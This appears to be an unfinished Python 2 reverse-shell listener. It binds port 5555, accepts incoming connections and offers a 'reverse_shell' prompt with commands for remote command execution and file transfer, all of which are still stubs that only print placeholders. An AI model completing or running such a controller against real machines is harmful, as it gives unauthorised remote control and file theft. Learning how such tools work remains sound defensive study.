import socket
import json
import sys

PORT_NUM = 5555

COMMANDS = {'help':'print help',
            'cmd':'cmd [OPTION] OPTION - console command',
            'getfile':'getfile [FILEPATH] [LOCALPATH]- get file from remote',
            'sendfile':'sendfile [LOCALPATH] [REMOTEPATH]- send file to remote',
            'exit':'stop server',
           }

class Server(object):
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(socket.SOMAXCONN)
        while True:
            client, address = self.sock.accept()
            print 'recived connection from:',address
            self.consoleWithClient(client, address)
    
    def consoleWithClient(self, client, address):
        command = 'initial'
        while command not in 'exit':
            command = raw_input('reverse_shell:{}>'.format(address))
            
            if 'help' in command:
                print json.dumps(COMMANDS, indent=4)

            if 'exit' in command:
                print 'exit server'
                sys.exit()

            if 'cmd' in command:
                self.excuteRemoteCommand(client, address, command)
            
            if 'getfile' in command:
                print 'getfile'
            
            if 'sendfile' in command:
                print 'sendfile'

    def excuteRemoteCommand(self,client, address, command):
        print 'excutecommand'

if __name__ == "__main__":
    Server('',PORT_NUM).listen()